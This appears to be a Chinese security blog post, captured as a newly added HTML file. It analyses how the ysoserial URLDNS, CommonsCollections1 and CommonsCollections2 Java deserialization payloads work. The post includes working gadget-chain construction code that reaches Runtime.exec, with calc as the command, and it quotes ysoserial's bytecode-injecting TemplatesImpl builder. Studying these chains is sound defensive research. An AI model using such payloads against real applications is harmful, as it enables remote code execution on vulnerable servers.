@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          ysoserial payload分析 - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2020/02/ysoserial-payload分析/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#java" title="java">java</a>
+                        
+                    </div>
+                    <h1>ysoserial payload分析</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2020-02-08
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><p>先从最简单的开始，根据ysoserial中的gadget提示，可以比较容易的找到触发过程<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">    HashMap.readObject()</span><br><span class="line">        HashMap.putVal()</span><br><span class="line">            HashMap.hash()</span><br><span class="line">                URL.hashCode()</span><br></pre></td></tr></table></figure></p>
+<p>在<code>HashMap</code>中重写了<code>readObject</code>方法，在最后放置key、value时有一个对key的hash操作<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure></p>
+<p>里面调用了key的hashCode方法<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在URL的hashCode中,假如hashCode!=-1,则会调用handler的hashCode方法，去计算hash<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>handler是一个抽象类，但是实现了<code>hashCode</code>方法，里面对传入的url进行了<code>getHostAddress</code><br>这里就会发送一次DNS请求<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InetAddress addr = getHostAddress(u);</span><br></pre></td></tr></table></figure></p>
+<p>由于比较简单，我自己也尝试构造了下</p>
+<ul>
+<li>由于hashCode是private，所以要用反射修改下值</li>
+<li>set操作要在put之后，因为put时会重新计算一遍hashCode</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;URL, String&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">URL url = <span class="keyword">new</span> URL(<span class="string">"http://dns.kingkk.com"</span>);</span><br><span class="line">Class&lt;?&gt; clz = URL<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">Field f = clz.getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">map.put(url, <span class="string">"payload"</span>);</span><br><span class="line">f.set(url, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> map;</span><br></pre></td></tr></table></figure>
+<h1 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h1><p>基于3.1版本的payload<code>@Dependencies({&quot;commons-collections:commons-collections:3.1&quot;})</code><br>看了下ysoserial中给的gadget信息<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">	AnnotationInvocationHandler.readObject()</span><br><span class="line">		Map(Proxy).entrySet()</span><br><span class="line">			AnnotationInvocationHandler.invoke()</span><br><span class="line">				LazyMap.get()</span><br><span class="line">					ChainedTransformer.transform()</span><br><span class="line">						ConstantTransformer.transform()</span><br><span class="line">						InvokerTransformer.transform()</span><br><span class="line">							Method.invoke()</span><br><span class="line">								Class.getMethod()</span><br><span class="line">						InvokerTransformer.transform()</span><br><span class="line">							Method.invoke()</span><br><span class="line">								Runtime.getRuntime()</span><br><span class="line">						InvokerTransformer.transform()</span><br><span class="line">							Method.invoke()</span><br><span class="line">								Runtime.exec()</span><br></pre></td></tr></table></figure></p>
+<p>emmm，这回换一种方式，先从LazyMap开始看（一个原因也是因为它是第一步进入<code>Commons-Collections</code>的类）<br>来到get方法可以看到有个if分支是调用了<code>transform</code><br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200205235944.png" alt><br><code>factory</code>是一个Transformer接口<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200206000046.png" alt><br><code>ChainedTransformer</code>正好就是个实现了<code>Transformer</code>接口的类<br>它的<code>transform</code>实现就很有意思了<br>将成员变量<code>iTransformers</code>数组中的类，递归调用<code>transform</code>,类似于reduce的操作<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200206000206.png" alt><br>再来看<code>InvokerTransformer</code>的<code>transform</code>实现<br>对于invoke操作来说，method、input、iArgs都是可控的（因为都是成员变量或者成员变量可控的）<br>这样就意味着可以调用任意类的任意方法<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200206000501.png" alt></p>
+<p>感觉后面transformer的调用比较好比理解，前半部分<code>AnnotationInvocationHandler</code>的调用就更有意思了<br>需要补充一些Java动态代理的知识点，这里就不展开讲。简单来说就是动态代理之后的方法调用会转移到invoke的调用上。<br>在这个payload中就是将readObject中的<code>entrySet</code>方法调用，转换成了invoke中的<code>get</code>方法，从而执行LazyMap的get方法，将readObject和get方法串联在一起（为什么不直接找一个readObject中调用了Map.get的?是不好找，还是说invoke的方法更类似于一种通用解？）</p>
+<p>这里先来看前半部分<code>AnnotationInvocationHandler</code>的payload生成(按照自己的方式稍微调整了下)<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"><span class="keyword">final</span> Map mapProxy = createMemoitizedProxy(lazyMap, Map<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="keyword">final</span> InvocationHandler handler = createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createMemoitizedProxy</span><span class="params">(<span class="keyword">final</span> Map&lt;String, Object&gt; map, <span class="keyword">final</span> Class&lt;T&gt; iface, <span class="keyword">final</span> Class&lt;?&gt;... ifaces)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    InvocationHandler ih = createMemoizedInvocationHandler(map);</span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt;[] allIfaces = (Class&lt;?&gt;[]) Array.newInstance(Class<span class="class">.<span class="keyword">class</span>, <span class="title">ifaces</span>.<span class="title">length</span> + 1)</span>;</span><br><span class="line">    allIfaces[<span class="number">0</span>] = iface;</span><br><span class="line">    <span class="keyword">if</span> (ifaces.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        System.arraycopy(ifaces, <span class="number">0</span>, allIfaces, <span class="number">1</span>, ifaces.length);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> iface.cast(Proxy.newProxyInstance(YsoserialTest<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(), <span class="title">allIfaces</span>, <span class="title">ih</span>))</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InvocationHandler <span class="title">createMemoizedInvocationHandler</span><span class="params">(<span class="keyword">final</span> Map&lt;String, Object&gt; map)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String handleName = <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>;</span><br><span class="line">    <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(handleName).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">    ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span> (InvocationHandler) ctor.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><code>createMemoizedInvocationHandler</code>: 很明显能看出是实例化<code>AnnotationInvocationHandler</code>一个实例（由于修饰符是默认的，不在同一个包下只能通过反射的方式）</li>
+<li><code>createMemoitizedProxy</code>：创建一个<code>AnnotationInvocationHandler</code>代理的Map实例</li>
+</ul>
+<p>然后传递的变量也值得注意下，最后返回的是一个<code>AnnotationInvocationHandler</code>实例<br>并且handler的成员变量<code>iTransformers</code>也是一个由<code>AnnotationInvocationHandler</code>代理的Map<br>搞清楚这些之后，来分析逻辑就比较清晰了。</p>
+<p>一开始应该就是调用到handler的<code>reabObject</code>方法,在这里调用了一次<code>iTransformers</code>的<code>entrySet</code>方法<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200206164801.png" alt><br>由于传入的<code>iTransformers</code>是个动态代理，所以会调用到处理器的invoke方法上，也就是<code>AnnotationInvocationHandler</code>的invoke方法<br>在invoke方法中调用了<code>iTransformers</code>的get方法<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200206165006.png" alt><br>到这里，就将readObject和LazyMap的get方法连在一起了<br>需要注意的是这里传入的参数是不可控的（var4是被调用函数的名字）<br>所以这也就引出了另一个没有被介绍到的类<code>ConstantTransformer</code><br>它的<code>transform</code>方法返回值与传参无关，是由成员变量决定的<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200206175821.png" alt></p>
+<p>这样子整个逻辑就差不多可以串起来了<br>通过<code>AnnotationInvocationHandler</code>的readObject触发到成员变量<code>iTransformers</code>的entrySet<br>由于代理的关系触发到invoke的逻辑，从而触发LazyMap的get方法<br>通过LazyMap的get方法，可以调用成员变量的transform方法，从而触发到<code>ChainedTransformer</code>的transform<br><code>ChainedTransformer</code>的transform可以以reduce的方式去调用Transform数组的transform方法<br>由于传入的key不可控，所以通过<code>ConstantTransformer</code>的<code>transform</code>返回一个可以由成员变量控制的值<br>这样reduce的第一次由ConstantTransformer返回Runtime.class类<br>第二次由InvokerTransformer执行<code>Runtime.class.getMethod(&quot;getRuntime&quot;)</code>返回getRuntime方法<br>第三次由InvokerTransformer执行<code>Method.invoke(getRuntime, null)</code>(通过反射执行了Runtime.getRuntime静态方法)返回Runtime实例<br>第四次由InvokerTransformer执行Runtime实例的<code>exec</code>方法</p>
+<p>这样整个命令执行过程就完成了。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> String[] execArgs = <span class="keyword">new</span> String[]&#123;<span class="string">"calc"</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">        <span class="keyword">new</span> Transformer[]&#123;<span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;);</span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">        new InvokerTransformer("getMethod", new Class[]&#123;</span><br><span class="line">                String.class, Class[].class&#125;, new Object[]&#123;</span><br><span class="line">                <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                Object.class, Object[].class&#125;, new Object[]&#123;</span><br><span class="line">                <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;, <span class="title">execArgs</span>)&#125;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"><span class="keyword">final</span> Map mapProxy = createMemoitizedProxy(lazyMap, Map<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"><span class="keyword">final</span> InvocationHandler handler = createMemoizedInvocationHandler(mapProxy);</span><br><span class="line">setFieldValue(transformerChain, <span class="string">"iTransformers"</span>, transformers); </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handler;</span><br></pre></td></tr></table></figure></p>
+<p>相较于ysoserial中的payload，Transfrom数组中少了个<code>new ConstantTransformer(1)</code>,亲测是可以去掉的</p>
+<p>本来之前还有个疑问就是，为什么不直接一开始就传个<code>new ProcessBuilder(&quot;cmd&quot;)</code>对象，然后直接执行start方法即可，这样payload也会更简单。<br>亲手试了之后会发现<code>ProcessBuilder</code>类由于没有实现<code>Serializable</code>接口，从而不能进行反序列化。（Runtime也是同理）<br>但是Class类这些反射库文件都是实现了<code>Serializable</code>接口的，所以只能通过比较繁琐的反射方式来执行命令。</p>
+<p>还有一个小问题就是这个payload在高版本的java8环境中是无法执行的。<br>参考了下这篇文章前半部分的内容<a href="http://www.secwk.com/2019/11/14/14183/" target="_blank" rel="noopener">http://www.secwk.com/2019/11/14/14183/</a><br>是由于在java8的某次更新中对<code>AnnotationInvocationHandler</code>进行了修改 <a href="http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/diff/8e3338e7c7ea/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java" target="_blank" rel="noopener">http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/diff/8e3338e7c7ea/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java</a><br>jdk1.8_u40和jdk1.8_u112的对比就能看到，entrySet的调用变成了var4<br>原本<code>var1.defaultReadObject();</code>的调用也重写了<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200206194442.png" alt></p>
+<p>所以原本entrySet的invoke调用链也就断了，但是这个问题会在后面的Payload中被解决。（当然是找了条别的链）</p>
+<p>看了下commons-collections4中的类，类名和方法都是类似的，只是其中增加了很多泛型的操作，并且LazyMap的decorate方法被移除了，并且LazyMap的初始化方法是default修饰符，所以需要用下反射来构造LazyMap类即可。(亲测，可用，得劲)<br>需要注意下引入的类名也变成了<code>org.apache.commons.collections4.*</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原本的 final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span></span><br><span class="line">Constructor ctor = LazyMap.class.getDeclaredConstructors()[0];</span><br><span class="line">ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">final</span> Map lazyMap = (Map) ctor.newInstance(innerMap, transformerChain);</span><br></pre></td></tr></table></figure></p>
+<h1 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h1><p>基于4.0版本的payload<code>@Dependencies({ &quot;org.apache.commons:commons-collections4:4.0&quot; })</code><br>来看下ysoserial中给出的gadget信息，这回的信息相对简洁<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">	PriorityQueue.readObject()</span><br><span class="line">		...</span><br><span class="line">			TransformingComparator.compare()</span><br><span class="line">				InvokerTransformer.transform()</span><br><span class="line">					<span class="function"><span class="keyword">Method</span>.<span class="title">invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">						<span class="title">Runtime</span>.<span class="title">exec</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></p>
+<p>这回commons-collections中的调用链到了<code>TransformingComparator.compare()</code>来触发<code>InvokerTransformer.transform()</code><br>相较于之前<code>ChainedTransformer.transform()</code>方法来说，少了reduce的操作，只能调用一次<code>transform</code>方法。<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200206223317.png" alt><br>所以，是如何通过一次invoke的调用，进行命令执行的，这里也是很有意思的部分<br>ysoserial中把这个封装成了<code>Gadgets.createTemplatesImpl</code>,可以详细看看这里是如何生成这个<code>templates</code>的<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( Boolean.parseBoolean(System.getProperty(<span class="string">"properXalan"</span>, <span class="string">"false"</span>)) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> createTemplatesImpl(</span><br><span class="line">            command,</span><br><span class="line">            Class.forName(<span class="string">"org.apache.xalan.xsltc.trax.TemplatesImpl"</span>),</span><br><span class="line">            Class.forName(<span class="string">"org.apache.xalan.xsltc.runtime.AbstractTranslet"</span>),</span><br><span class="line">            Class.forName(<span class="string">"org.apache.xalan.xsltc.trax.TransformerFactoryImpl"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> createTemplatesImpl(command, TemplatesImpl<span class="class">.<span class="keyword">class</span>, <span class="title">AbstractTranslet</span>.<span class="title">class</span>, <span class="title">TransformerFactoryImpl</span>.<span class="title">class</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> T templates = tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use template gadget class</span></span><br><span class="line">    ClassPool pool = ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(abstTranslet));</span><br><span class="line">    <span class="keyword">final</span> CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">    <span class="comment">// run command in static initializer</span></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line">    String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">        command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">        <span class="string">"\");"</span>;</span><br><span class="line">    clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">    <span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">    clazz.setName(<span class="string">"ysoserial.Pwner"</span> + System.nanoTime());</span><br><span class="line">    CtClass superC = pool.get(abstTranslet.getName());</span><br><span class="line">    clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject class bytes into instance</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;</span><br><span class="line">        classBytes, ClassFiles.classAsBytes(Foo<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">    &#125;)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"Pwnr"</span>);</span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">"_tfactory"</span>, transFactory.newInstance());</span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里就很nb了，可以看到是借助了<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类<br>这个类里面有两个属性</p>
+<ul>
+<li><code>_bytecodes</code>: 是记载字节码信息的</li>
+<li><code>_class</code>: 根据<code>_bytecodes</code>的字节码信息生成的类</li>
+</ul>
